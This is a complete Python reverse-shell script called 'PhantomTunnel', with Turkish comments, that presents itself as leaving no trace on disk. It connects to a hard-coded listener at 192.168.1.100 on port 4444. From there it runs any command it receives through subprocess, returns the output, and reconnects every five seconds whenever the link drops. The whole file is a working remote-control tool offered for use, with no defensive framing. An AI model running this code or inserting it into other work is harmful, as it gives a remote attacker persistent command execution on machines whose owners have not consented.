#!/usr/bin/env python3
"""
PhantomDisk - RAM Reverse Shell (PhantomTunnel)
Geliştirici: burakcanbalta | 2025
Amaç: RAM ortamında çalışan, disk iz bırakmayan canlı bağlantı sistemi.
"""

import socket
import subprocess
import os
import time

# Sunucu IP ve port ayarı
REMOTE_HOST = "192.168.1.100"  # Kendi dinlediğin IP (netcat veya VPS)
REMOTE_PORT = 4444             # Port (netcat ile uyumlu)

def connect_and_listen():
    print("[*] PhantomTunnel bağlantı başlatılıyor...")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((REMOTE_HOST, REMOTE_PORT))
            s.send(b"[+] PhantomTunnel baglandi.\n")

            while True:
                cmd = s.recv(1024).decode().strip()
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd:
                    output = subprocess.getoutput(cmd)
                    s.send((output + "\n").encode())

        except Exception as e:
            time.sleep(5)  # Bağlantı yoksa 5 sn sonra tekrar dene
        finally:
            s.close()

if __name__ == "__main__":
    connect_and_listen()
